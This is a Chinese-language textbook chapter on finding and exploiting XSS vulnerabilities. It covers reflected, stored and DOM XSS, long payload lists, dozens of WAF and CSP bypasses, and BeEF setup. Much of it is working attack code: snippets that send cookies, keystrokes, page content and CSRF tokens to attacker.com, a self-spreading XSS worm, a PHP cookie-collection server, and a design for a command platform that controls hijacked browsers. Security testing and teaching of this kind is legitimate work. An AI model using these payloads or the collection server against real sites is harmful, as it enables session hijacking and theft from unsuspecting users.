# 第六章 XSS跨站脚本漏洞挖掘

## 6.1 XSS概述

### 6.1.1 什么是XSS

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击，攻击者通过在Web页面中注入恶意脚本代码，当其他用户浏览该页面时，嵌入的恶意脚本代码会在用户浏览器中执行，从而窃取用户敏感信息或进行其他恶意操作。

**为什么叫XSS而不是CSS？**
因为CSS（Cascading Style Sheets）已经是层叠样式表的缩写，为了避免混淆，将Cross-Site Scripting缩写为XSS。

**XSS漏洞的本质**
XSS漏洞的本质是**HTML注入**，攻击者可以在页面中注入任意HTML/JavaScript代码，从而控制用户浏览器的行为。

### 6.1.2 XSS的危害

XSS可能导致以下危害：

1. **Cookie窃取**：获取用户的Cookie，冒充用户身份
2. **会话劫持**：接管用户的登录会话
3. **钓鱼攻击**：伪造登录页面，窃取用户密码
4. **键盘记录**：记录用户输入的敏感信息
5. **网页篡改**：修改页面内容，传播恶意信息
6. **恶意操作**：以用户身份执行操作，如转账、发帖
7. **传播蠕虫**：利用XSS传播恶意脚本
8. **内网探测**：利用用户浏览器探测内网
9. **浏览器漏洞利用**：结合浏览器漏洞获取系统权限
10. **挖矿攻击**：利用用户浏览器挖矿

### 6.1.3 XSS的分类

**反射型XSS**
- 恶意脚本通过URL参数传递
- 服务器将参数直接输出到页面
- 需要诱骗用户点击恶意链接
- 一次性的，不会持久存储

**存储型XSS**
- 恶意脚本存储在服务器（数据库、文件等）
- 每次访问都会执行恶意脚本
- 影响所有访问该页面的用户
- 持久性的，危害更大

**DOM型XSS**
- 恶意脚本通过DOM操作注入
- 不经过服务器，纯前端处理
- 利用JavaScript动态修改DOM
- 难以检测，隐蔽性强

**其他分类方式**

| 分类方式 | 类型 | 说明 |
|---------|------|------|
| 按触发方式 | 反射型 | 参数直接反射到页面 |
| | 存储型 | 存储在数据库中 |
| | DOM型 | 前端DOM操作 |
| 按利用方式 | Cookie窃取 | 盗取用户Cookie |
| | 钓鱼攻击 | 伪造登录页面 |
| | XSS蠕虫 | 自动传播 |
| | 键盘记录 | 记录用户输入 |
| 按利用难度 | 普通XSS | 直接注入script标签 |
| | 受限XSS | 有过滤需要绕过 |
| | Self-XSS | 需要用户交互 |
| | Universal XSS | 浏览器级别的XSS |

## 6.2 反射型XSS

### 6.2.1 反射型XSS原理

反射型XSS的攻击流程：
1. 攻击者构造包含恶意脚本的URL
2. 诱骗用户点击该URL
3. 服务器接收请求，将参数直接输出到页面
4. 用户浏览器执行恶意脚本

**示例代码**
```php
<?php
$name = $_GET['name'];
echo "Hello, " . $name;
?>
```

**正常请求**
```
http://example.com/hello.php?name=admin
输出：Hello, admin
```

**XSS攻击**
```
http://example.com/hello.php?name=<script>alert('XSS')</script>
输出：Hello, <script>alert('XSS')</script>
浏览器执行：弹出alert框
```

### 6.2.2 反射型XSS检测

**手工检测**
```
# 基本测试
?name=<script>alert(1)</script>

# 使用事件
?name=<img src=x onerror=alert(1)>

# 使用SVG
?name=

<svg onload=alert(1)>


# 使用body
?name=<body onload=alert(1)>

# 使用input
?name=<input onfocus=alert(1) autofocus>

# 使用details
?name=<details open ontoggle=alert(1)>
```

**Burp Suite检测**
1. 拦截请求
2. 发送到Repeater
3. 修改参数为XSS payload
4. 观察响应是否包含payload
5. 注意观察输出的位置（HTML标签中、属性中、JavaScript中、CSS中）

**XSStrike检测**
```bash
python xsstrike.py -u "http://example.com/page?param=test"

# 爬取网站并扫描
python xsstrike.py -u "http://example.com/" --crawl

# POST参数
python xsstrike.py -u "http://example.com/login" --data "username=test&password=test"
```

**检测时的注意事项**
1. **输出位置很重要**：不同的输出位置需要不同的payload
   - HTML标签之间：<script>等
   - HTML属性中：需要闭合属性
   - JavaScript中：需要闭合引号和script
   - CSS中：使用expression等
2. **注意编码问题**：URL编码、HTML编码、Unicode编码等
3. **注意过滤绕过**：可能存在过滤，需要尝试不同的payload
4. **注意响应头**：Content-Type、X-XSS-Protection等

### 6.2.3 反射型XSS利用

**窃取Cookie**
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

**钓鱼攻击**
```javascript
<script>
document.body.innerHTML = '<h3>Login</h3><form action="http://attacker.com/steal"><input name="username"><input name="password" type="password"><input type="submit"></form>';
</script>
```

**键盘记录**
```javascript
<script>
document.onkeypress = function(e) {
    var img = new Image();
    img.src = "http://attacker.com/key?key=" + e.key;
}
</script>
```

**页面跳转**
```javascript
<script>
window.location.href = "http://attacker.com/phishing";
</script>
```

**获取页面内容**
```javascript
<script>
var content = document.body.innerHTML;
var img = new Image();
img.src = "http://attacker.com/steal?content=" + encodeURIComponent(content);
</script>
```

## 6.3 存储型XSS

### 6.3.1 存储型XSS原理

存储型XSS的攻击流程：
1. 攻击者将恶意脚本提交到服务器
2. 服务器存储恶意脚本（数据库、文件等）
3. 其他用户访问包含恶意脚本的页面
4. 用户浏览器执行恶意脚本

**示例场景**
- 论坛帖子
- 评论留言
- 用户资料
- 商品评价
- 消息通知
- 用户名/昵称
- 文章内容
- 个性化设置

**示例代码**
```php
<?php
// 存储评论
$comment = $_POST['comment'];
mysql_query("INSERT INTO comments(content) VALUES('$comment')");

// 显示评论
$result = mysql_query("SELECT content FROM comments");
while($row = mysql_fetch_array($result)) {
    echo $row['content'] . "<br>";
}
?>
```

**XSS攻击**
```
提交评论：<script>alert('XSS')</script>
存储到数据库：恶意脚本被保存
其他用户访问：弹出alert框
```

### 6.3.2 存储型XSS检测

**测试位置**
- 用户输入字段：用户名、昵称、简介
- 内容输入字段：帖子、评论、留言
- 文件上传：文件名、文件内容
- 富文本编辑器：HTML内容
- 个人资料：个性签名、自我介绍
- 消息系统：私信、通知
- 订单系统：收货地址、备注

**测试方法**
```
# 基本测试
<script>alert(1)</script>

# 闭合标签测试
</script><script>alert(1)</script>

# 事件测试
<img src=x onerror=alert(1)>

# SVG测试
<svg onload=alert(1)>

# 富文本编辑器测试
<p>test</p><img src=x onerror=alert(1)>

# 事件属性测试
<div onmouseover=alert(1)>test</div>
```

**检测技巧**
1. **注意数据流转**：输入在哪里，输出在哪里
2. **注意编码转换**：存储时编码，输出时解码
3. **注意过滤策略**：前端过滤、后端过滤、输出编码
4. **注意不同场景**：有的地方只过滤<script>，但允许其他标签
5. **注意大小写问题**：有的过滤只过滤小写

### 6.3.3 存储型XSS利用

**XSS Worm（蠕虫）**
```javascript
<script>
// 获取当前用户Cookie
var cookie = document.cookie;

// 构造恶意请求，传播XSS
var xhr = new XMLHttpRequest();
xhr.open("POST", "/post/comment", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("comment=<script>alert(1)</script>&cookie=" + cookie);

// 继续传播
</script>
```

**窃取敏感信息**
```javascript
<script>
// 获取页面内容
var content = document.body.innerHTML;

// 发送到攻击者服务器
var img = new Image();
img.src = "http://attacker.com/steal?data=" + encodeURIComponent(content);
</script>
```

**自动操作**
```javascript
<script>
// 自动发帖/评论
var xhr = new XMLHttpRequest();
xhr.open("POST", "/post/create", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("title=XSS&content=<script>alert(1)</script>");
</script>
```

**窃取CSRF Token**
```javascript
<script>
// 获取CSRF Token
var token = document.querySelector('meta[name="csrf-token"]').content;

// 发送到攻击者服务器
var img = new Image();
img.src = "http://attacker.com/steal?token=" + token;
</script>
```

## 6.4 DOM型XSS

### 6.4.1 DOM型XSS原理

DOM型XSS不经过服务器，完全在客户端执行。攻击者通过修改DOM环境，使JavaScript代码执行恶意操作。

**示例代码**
```javascript
<script>
var name = location.hash.substring(1);
document.write("Hello, " + name);
</script>
```

**正常请求**
```
http://example.com/page.html#admin
输出：Hello, admin
```

**XSS攻击**
```
http://example.com/page.html#<script>alert(1)</script>
输出：Hello, <script>alert(1)</script>
浏览器执行：弹出alert框
```

**DOM型XSS的特点**
1. 不经过服务器，纯前端处理
2. 难以被WAF检测
3. 难以在服务器日志中发现
4. 需要分析JavaScript代码
5. 常见于单页应用（SPA）

### 6.4.2 DOM型XSS常见场景

**document.write**
```javascript
document.write(location.search);
document.write(location.hash);
document.write(document.referrer);
document.write(document.URL);
```

**innerHTML**
```javascript
element.innerHTML = location.hash;
element.innerHTML = getUrlParam('name');
element.innerHTML = localStorage.getItem('name');
```

**eval**
```javascript
eval(location.search);
eval(location.hash.substring(1));
eval(getUrlParam('code'));
```

**setTimeout/setInterval**
```javascript
setTimeout(location.hash.substring(1), 1000);
setInterval(getUrlParam('func'), 1000);
```

**jQuery**
```javascript
$(location.hash);
$('#' + location.hash.substring(1));
$(element).html(location.hash);
```

**URL操作**
```javascript
var url = new URL(location.href);
document.write(url.searchParams.get('name'));
```

**PostMessage**
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});
```

**Web Storage**
```javascript
var name = localStorage.getItem('name');
document.write(name);
```

### 6.4.3 DOM型XSS检测

DOM型XSS难以自动化检测，需要手工分析JavaScript代码：

1. 查找危险函数：document.write、innerHTML、eval等
2. 分析数据来源：location、document.URL、document.referrer等
3. 构造测试payload
4. 观察是否触发XSS

**测试payload**
```javascript
# URL参数
?name=<img src=x onerror=alert(1)>

# Hash参数
#<img src=x onerror=alert(1)>

# PostMessage
window.postMessage('<img src=x onerror=alert(1)>', '*')

# Referer
Referer: <img src=x onerror=alert(1)>
```

**检测工具**
1. **Burp Suite**：被动扫描JavaScript
2. **DOMXSSScanner**：专门扫描DOM XSS
3. **浏览器开发者工具**：断点调试JavaScript
4. **代码审计**：人工分析JavaScript代码

### 6.4.4 DOM型XSS高级技巧

**利用jQuery选择器**
```javascript
// 如果页面使用了jQuery
// 可以通过location.hash触发XSS
http://example.com/page#<img src=x onerror=alert(1)>
// 但有些情况下不会直接执行
// 可以尝试：
http://example.com/page#<script>alert(1)</script>
```

**利用location.hash + innerHTML**
```javascript
// 页面代码
<div id="content"></div>
<script>
document.getElementById('content').innerHTML = location.hash.substring(1);
</script>

// 利用
http://example.com/page#<img src=x onerror=alert(1)>
```

**利用document.write和闭合标签**
```javascript
// 页面代码
<script>
document.write("<div>" + location.search + "</div>");
</script>

// 利用
?param=</div><script>alert(1)</script><div>
```

**利用PostMessage**
```javascript
// 页面代码
window.addEventListener('message', function(e) {
    eval(e.data);
});

// 利用
window.postMessage('alert(1)', '*');
```

## 6.5 XSS挖掘实战完整流程

### 6.5.1 信息收集阶段

**第一步：确定测试范围**
- 目标网站域名
- 子域名收集
- 目录爬取
- API接口发现

**第二步：识别输入点**
- URL参数（GET）
- 表单参数（POST）
- Cookie
- HTTP头
- 上传文件名
- URL路径
- JSON参数
- XML参数

**第三步：识别输出点**
- 页面内容
- HTML属性
- JavaScript变量
- CSS样式
- HTTP响应头
- 重定向URL

### 6.5.2 漏洞发现阶段

**第一步：初步测试**
1. 在每个输入点输入特殊字符：< > " ' ` ( ) ; = &
2. 观察响应中这些字符是否被过滤或编码
3. 标记可能存在漏洞的输入点

**第二步：确定输出位置**
- HTML标签之间
- HTML属性值中
- JavaScript代码中
- CSS样式中
- URL中

**第三步：构造测试Payload**
根据输出位置选择合适的payload：
- HTML标签中：<img src=x onerror=alert(1)>
- 属性中：" onerror=alert(1) x="
- JS中：';alert(1);//
- CSS中：expression(alert(1))

**第四步：验证漏洞**
1. 构造完整的payload
2. 发送请求
3. 观察是否触发XSS
4. 确认是反射型、存储型还是DOM型

### 6.5.3 漏洞利用阶段

**第一步：评估影响**
- 可以窃取Cookie吗？（是否有HttpOnly）
- 可以获取用户信息吗？
- 可以执行操作吗？
- 影响范围有多大？

**第二步：构造利用代码**
- Cookie窃取代码
- 钓鱼页面代码
- 键盘记录代码
- 蠕虫传播代码

**第三步：测试利用效果**
- 在自己的测试账号上测试
- 确认利用代码可以正常工作
- 评估危害程度

### 6.5.4 漏洞报告阶段

**第一步：整理证据**
- 漏洞截图
- 请求响应包
- 复现步骤
- 利用代码

**第二步：编写报告**
- 漏洞名称
- 漏洞类型
- 严重程度
- 影响范围
- 复现步骤
- 修复建议

**第三步：提交报告**
- 按照SRC平台要求提交
- 提供清晰的复现步骤
- 附上截图和PoC

## 6.6 XSS Payload构造

### 6.6.1 基本Payload

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<script>alert(window.location)</script>
<script src=http://attacker.com/xss.js></script>
```

### 6.6.2 事件Payload

```html
<img src=x onerror=alert(1)>
<img src=1 onerror=alert(1)>
<img src="javascript:alert(1)">
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<div onmouseover=alert(1)>test</div>
<p onclick=alert(1)>test</p>
<a onmouseover=alert(1)>test</a>
<form onsubmit=alert(1)><input type=submit>
<iframe onload=alert(1)></iframe>
<object onload=alert(1)></object>
<embed onload=alert(1)>
```

### 6.6.3 标签Payload

```html
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### 6.6.4 编码Payload

**HTML实体编码**
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

**URL编码**
```html
<img src=x onerror=%61%6c%65%72%74(1)>
<a href="java%73cript:alert(1)">click</a>
```

**Unicode编码**
```html
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
```

**Base64编码**
```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**八进制编码**
```html
<img src=x onerror=\141\154\145\162\164(1)>
```

**HTML实体+URL编码混合**
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
```

### 6.6.5 绕过过滤Payload

**绕过script过滤**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script/src="http://attacker.com/xss.js">
<script	x>alert(1)</script>
<scri%00pt>alert(1)</scri%00pt>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```

**绕过onerror过滤**
```html
<img src=x oNerror=alert(1)>
<img src=x ONERROR=alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror=alert(1)//
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onmouseover=alert(1)>
<img src=x onclick=alert(1)>
```

**绕过空格过滤**
```html
<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>
<img%0Asrc=x%0Aonerror=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
<img/**/src=x/**/onerror=alert(1)>
```

**绕过引号过滤**
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(String.fromCharCode(49))>
```

**绕过括号过滤**
```html
<img src=x onerror=alert`1`>
<img src=x onerror=window.onerror=alert;throw 1>
<svg onload=alert&#40;1&#41;>
```

**绕过关键字过滤**
```html
<img src=x onerror=al\u0065rt(1)>
<img src=x onerror=eval('al'+'ert(1)')>
<img src=x onerror=window['alert'](1)>
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=Function`al\145rt(1)`()>
<img src=x onerror=setTimeout`alert\x281\x29`>
```

**绕过http/https过滤**
```html
<script src=//attacker.com/xss.js></script>
<script src=http://attacker.com/xss.js></script>
<script src=https://attacker.com/xss.js></script>
<img src=x onerror=document.write('<script src="//attacker.com/xss.js"></script>')>
```

### 6.6.6 属性中的XSS

**在value属性中**
```html
<input type="text" value="用户输入">
<!-- 闭合value属性 -->
"><script>alert(1)</script><input value="
" onmouseover=alert(1) x="
" autofocus onfocus=alert(1) x="
```

**在href属性中**
```html
<a href="用户输入">link</a>
<!-- javascript协议 -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**在src属性中**
```html
<img src="用户输入">
<!-- 利用javascript伪协议（仅限某些标签） -->
javascript:alert(1)
```

**在style属性中**
```html
<div style="用户输入">test</div>
<!-- 利用expression（IE） -->
expression(alert(1))
<!-- 利用@import -->
@import 'javascript:alert(1)'
```

**在JavaScript中**
```javascript
var name = "用户输入";
// 闭合引号
";alert(1);//
' ;alert(1);//
</script><script>alert(1)</script>
```

## 6.7 XSS绕过WAF的30+种方法

### 6.7.1 编码绕过

**方法1：URL编码**
```
%3Cscript%3Ealert(1)%3C/script%3E
```

**方法2：双重URL编码**
```
%253Cscript%253Ealert(1)%253C/script%253E
```

**方法3：HTML实体编码**
```
&#60;script&#62;alert(1)&#60;/script&#62;
```

**方法4：Unicode编码**
```
\u003cscript\u003ealert(1)\u003c/script\u003e
```

**方法5：八进制编码**
```
\74script\76alert(1)\74/script\76
```

**方法6：Base64编码**
```
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**方法7：十六进制编码**
```
\x3cscript\x3ealert(1)\x3c/script\x3e
```

### 6.7.2 标签和属性绕过

**方法8：大小写混合**
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>
```

**方法9：双写关键字**
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<ononerrorerror>
```

**方法10：插入注释**
```
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
<img src=x onerror=al<!-- -->ert(1)>
```

**方法11：插入空字节**
```
<scri%00pt>alert(1)</scri%00pt>
```

**方法12：插入空白字符**
```
<img%09src=x%09onerror=alert(1)>
<img%0Asrc=x%0Aonerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
<img%0Csrc=x%0Conerror=alert(1)>
```

**方法13：使用不常见的标签**
```
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<keygen onfocus=alert(1) autofocus>
<isindex onfocus=alert(1) autofocus>
```

**方法14：使用不常见的事件**
```
onmouseover、onmouseout、onmousedown、onmouseup
onclick、ondblclick、oncontextmenu
onkeydown、onkeypress、onkeyup
onfocus、onblur、onchange、onsubmit
onload、onerror、onabort、onunload
onanimationstart、onanimationend、onanimationiteration
ontransitionend、onwheel
```

### 6.7.3 特殊技术绕过

**方法15：利用JavaScript伪协议**
```
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
```

**方法16：利用data URI**
```
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

**方法17：利用CSS expression**
```
<div style="expression(alert(1))">test</div>
<style>body{expression(alert(1))}</style>
```

**方法18：利用CSS @import**
```
<style>@import 'http://attacker.com/xss.css';</style>
<style>@import 'javascript:alert(1)'</style>
```

**方法19：利用meta标签**
```
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
```

**方法20：利用location**
```
<script>location='javascript:alert(1)'</script>
<script>window.location='javascript:alert(1)'</script>
```

**方法21：利用eval和Function**
```
<img src=x onerror=eval('alert(1)')>
<img src=x onerror=Function('alert(1)')()>
<img src=x onerror=setTimeout('alert(1)',0)>
```

**方法22：利用反引号（Template Literal）**
```
<img src=x onerror=alert`1`>
<img src=x onerror=Function`alert(1)`()>
```

### 6.7.4 变形绕过

**方法23：字符串拼接**
```
<img src=x onerror='al'+'ert'+'(1)'>
<img src=x onerror="al"+"ert"+"(1)">
```

**方法24：数组方法**
```
<img src=x onerror=top['ale'+'rt'](1)>
<img src=x onerror=window['al'+'ert'](1)>
```

**方法25：with语句**
```
<img src=x onerror=with(top)alert(1)>
```

**方法26：原型链**
```
<img src=x onerror=__proto__.__proto__.constructor('alert(1)')()>
```

**方法27：URL跳转**
```
<img src=x onerror=location='http://attacker.com/xss.html?c='+document.cookie>
```

**方法28：利用self/top/parent/frames**
```
<img src=x onerror=self.alert(1)>
<img src=x onerror=top.alert(1)>
<img src=x onerror=parent.alert(1)>
<img src=x onerror=frames[0].alert(1)>
```

### 6.7.5 其他绕过技巧

**方法29：利用AngularJS**
```
{{constructor.constructor('alert(1)')()}}
```

**方法30：利用Vue.js**
```
{{constructor.constructor('alert(1)')()}}
```

**方法31：利用MHTML**
```
<img src="mhtml:http://attacker.com/xss.mht!xss">
```

**方法32：利用注释混淆**
```
<scri<!-- test -->pt>alert(1)</scri<!-- test -->pt>
```

**方法33：利用长字符串绕过**
```
<img src=x onerror="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaalert(1)">
```

**方法34：利用历史记录**
```
<script>history.pushState(0,0,'/fake')</script>
```

## 6.8 CSP绕过技巧

### 6.8.1 CSP概述

Content Security Policy（内容安全策略）是一种安全机制，用于限制网页中资源的加载来源，防止XSS攻击。

**CSP设置方式**
```html
<!-- HTTP响应头 -->
Content-Security-Policy: default-src 'self'

<!-- meta标签 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

**常见CSP指令**

&#124; 指令 &#124; 说明 &#124;
&#124;-----&#124;------&#124;
&#124; default-src &#124; 默认资源加载来源 &#124;
&#124; script-src &#124; JavaScript来源 &#124;
&#124; style-src &#124; CSS来源 &#124;
&#124; img-src &#124; 图片来源 &#124;
&#124; font-src &#124; 字体来源 &#124;
&#124; connect-src &#124; 连接来源（XHR、WebSocket） &#124;
&#124; frame-src &#124; iframe来源 &#124;
&#124; media-src &#124; 媒体来源 &#124;
&#124; object-src &#124; 对象来源 &#124;
&#124; base-uri &#124; base标签来源 &#124;
&#124; form-action &#124; 表单提交目标 &#124;

**常见的CSP值**

&#124; 值 &#124; 说明 &#124;
&#124;---&#124;------&#124;
&#124; 'self' &#124; 同源 &#124;
&#124; 'none' &#124; 不允许任何来源 &#124;
&#124; 'unsafe-inline' &#124; 允许内联脚本 &#124;
&#124; 'unsafe-eval' &#124; 允许eval &#124;
&#124; 'nonce-xxx' &#124; 允许特定nonce的脚本 &#124;
&#124; 'sha256-xxx' &#124; 允许特定哈希的脚本 &#124;
&#124; *.example.com &#124; 允许example.com所有子域名 &#124;
&#124; https: &#124; 允许所有HTTPS来源 &#124;

### 6.8.2 CSP绕过的10+种方法

**方法1：利用unsafe-inline**
如果CSP包含'unsafe-inline'，可以直接使用内联脚本：
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

**方法2：利用unsafe-eval**
如果CSP包含'unsafe-eval'，可以使用eval：
```html
<img src=x onerror=eval('alert(1)')>
<img src=x onerror=Function('alert(1)')()>
```

**方法3：利用允许的域名**
如果CSP允许某些域名，可以从这些域名加载脚本：
```html
<!-- 如果允许CDN域名 -->
<script src="https://cdn.example.com/angular.min.js"></script>
<!-- 然后利用AngularJS的XSS -->
{{constructor.constructor('alert(1)')()}}
```

**方法4：利用JSONP接口**
如果网站有JSONP接口，可以利用：
```html
<script src="/api/jsonp?callback=alert(1)//"></script>
```

**方法5：利用AngularJS**
如果页面使用了AngularJS且CSP允许'unsafe-inline'：
```html
{{constructor.constructor('alert(1)')()}}
```

**方法6：利用文件上传**
如果可以上传文件（如SVG、HTML）：
```html
<!-- 上传SVG文件 -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**方法7：利用base标签**
如果CSP没有设置base-uri：
```html
<base href="http://attacker.com/">
<script src="/xss.js"></script>
```

**方法8：利用脚本 gadgets**
如果允许加载某些脚本库，可以利用库中的XSS：
```html
<!-- 利用jQuery -->
<script>$(location.hash)</script>

<!-- 利用AngularJS -->
{{constructor.constructor('alert(1)')()}}

<!-- 利用Vue.js -->
{{constructor.constructor('alert(1)')()}}
```

**方法9：利用CSS样式**
如果style-src设置为'unsafe-inline'：
```html
<style>
@expression(alert(1));
</style>
```

**方法10：利用iframe + srcdoc**
```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

**方法11：利用URL跳转**
```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

**方法12：利用nonce预测**
如果nonce是可预测的：
```html
<script nonce="predictable_nonce">alert(1)</script>
```

**方法13：利用CSP报告功能**
如果CSP设置了report-uri，有时可以利用：
```html
<script>
// 触发CSP报告，可能泄露信息
</script>
```

### 6.8.3 CSP绕过实战思路

1. **仔细分析CSP规则**：找出所有允许的来源和指令
2. **寻找可利用的域名**：在允许的域名中寻找可以控制的内容
3. **寻找JSONP接口**：同源的JSONP可以用来执行代码
4. **寻找上传功能**：上传HTML/SVG等文件
5. **利用前端框架**：AngularJS、Vue.js等框架的模板注入
6. **利用浏览器特性**：如srcdoc、data URI等
7. **尝试各种组合**：不同的绕过方法组合使用

## 6.9 XSS利用平台搭建

### 6.9.1 为什么需要XSS利用平台

手动编写XSS利用代码效率低下，而且功能有限。使用XSS利用平台可以：
1. 集中管理被攻陷的浏览器
2. 提供丰富的利用模块
3. 自动化执行攻击
4. 收集和整理数据
5. 方便团队协作

### 6.9.2 自建简单Cookie接收平台

**最简单的PHP接收端**
```php
<?php
// steal.php
$cookie = $_GET['cookie'];
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'];

$log = "[$time] IP: $ip\n";
$log .= "User-Agent: $user_agent\n";
$log .= "Referer: $referer\n";
$log .= "Cookie: $cookie\n";
$log .= str_repeat("-", 50) . "\n";

file_put_contents('cookies.txt', $log, FILE_APPEND);

// 返回1x1像素图片
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
?>
```

**XSS Payload**
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie);
</script>
```

**保存到文件的版本**
```php
<?php
// save.php
$data = $_GET['data'];
$type = $_GET['type'];
$time = date('Y-m-d_H-i-s');
$ip = $_SERVER['REMOTE_ADDR'];
$filename = "data/{$type}_{$ip}_{$time}.txt";
file_put_contents($filename, $data);
?>
```

### 6.9.3 XSS Platform搭建

XSS Platform是一个功能完善的XSS利用平台。

**搭建步骤**
1. 下载XSS Platform源码
2. 配置PHP环境和MySQL数据库
3. 导入数据库文件
4. 修改配置文件
5. 配置域名和SSL证书
6. 部署上线

**使用方法**
```javascript
<script src="http://xssplatform.com/XSS.js"></script>
```

**功能模块**
1. Cookie窃取
2. 页面内容获取
3. 键盘记录
4. 表单劫持
5. 钓鱼攻击
6. 浏览器信息收集
7. 内网扫描

### 6.9.4 高级利用平台架构设计

如果你需要自己搭建一个功能完善的XSS利用平台，可以考虑以下架构：

**后端**
- Python/Node.js/PHP
- 数据库：MySQL/MongoDB
- Web框架：Flask/Django/Express

**前端**
- 管理后台：Vue/React
- 受害者端：纯JavaScript

**功能模块**
1. **会话管理**：管理被攻陷的浏览器
2. **命令控制**：发送命令给受害者浏览器
3. **数据收集**：Cookie、页面内容、键盘记录等
4. **攻击模块**：钓鱼、内网扫描、漏洞利用等
5. **文件管理**：上传下载文件

## 6.10 BeEF框架详解

### 6.10.1 BeEF简介

BeEF（Browser Exploitation Framework）是一个专业的浏览器渗透测试框架，专注于利用浏览器漏洞进行攻击。

**BeEF的特点**
1. 功能强大，模块丰富
2. 支持多种浏览器
3. 跨平台
4. 活跃的社区支持
5. 集成了很多浏览器漏洞利用

### 6.10.2 BeEF安装

**Kali Linux自带BeEF**
```bash
# 启动BeEF
beef-xss

# 或者
cd /usr/share/beef-xss
./beef
```

**源码安装**
```bash
# 克隆代码
git clone https://github.com/beefproject/beef.git
cd beef

# 安装依赖
./install

# 启动BeEF
./beef
```

**Docker安装**
```bash
docker pull janes/beef
docker run -p 3000:3000 janes/beef
```

### 6.10.3 BeEF配置

**配置文件**
```yaml
# main/config.yaml

# 监听地址和端口
beef:
    http:
        host: "0.0.0.0"
        port: "3000"
    
    # 管理员账号
    credentials:
        user: "beef"
        pass: "beef"
    
    # 网页挂马代码
    hook_file: "/hook.js"
```

**修改默认密码**
首次使用后务必修改默认密码，避免被他人利用。

### 6.10.4 BeEF使用

**Hook脚本**
```javascript
<script src="http://beefserver:3000/hook.js"></script>
```

**管理界面**
```
http://beefserver:3000/ui/panel
```

**主要功能模块**

&#124; 模块类别 &#124; 说明 &#124;
&#124;---------&#124;------&#124;
&#124; 浏览器信息 &#124; 收集浏览器、操作系统信息 &#124;
&#124; Cookie窃取 &#124; 获取用户Cookie &#124;
&#124; 会话劫持 &#124; 接管用户会话 &#124;
&#124; 网络探测 &#124; 扫描内网、端口扫描 &#124;
&#124; 社会工程 &#124; 钓鱼、弹窗欺骗 &#124;
&#124; 浏览器利用 &#124; 浏览器漏洞利用 &#124;
&#124; 持久化 &#124; 持久化控制 &#124;
&#124; 插件检测 &#124; 检测浏览器插件漏洞 &#124;

**常用模块使用**
1. **Get Cookie**：获取用户Cookie
2. **Get Page HTML**：获取当前页面HTML
3. **Key Logger**：键盘记录
4. **Redirect Browser**：页面跳转
5. **Internal Network Scan**：内网扫描
